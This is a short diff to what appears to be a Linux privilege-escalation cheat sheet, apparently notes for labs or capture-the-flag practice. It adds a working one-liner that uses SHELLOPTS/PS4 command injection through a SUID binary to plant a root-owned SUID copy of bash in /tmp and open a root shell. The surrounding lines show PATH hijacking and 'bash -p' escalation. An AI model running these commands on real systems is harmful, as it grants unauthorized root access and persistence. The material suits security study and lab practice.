@@ -139,7 +139,11 @@ compile custom executable with name of file suid binary is calling
 set PATH variable to current directory and run suid binary  
 
     PATH=.:$PATH /usr/local/bin/suid-env
-
+### SUID Binary Function Replace  
+    strings /usr/local/bin/suid-env2  
+    
+    env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp && chown root.root /tmp/bash && chmod +s /tmp/bash)' /bin/sh -c '/usr/local/bin/suid-env2; set +x; /tmp/bash -p' 
+    
 ### Misc SUID binaries 
 use binary to exec /bin/bash -p 
 
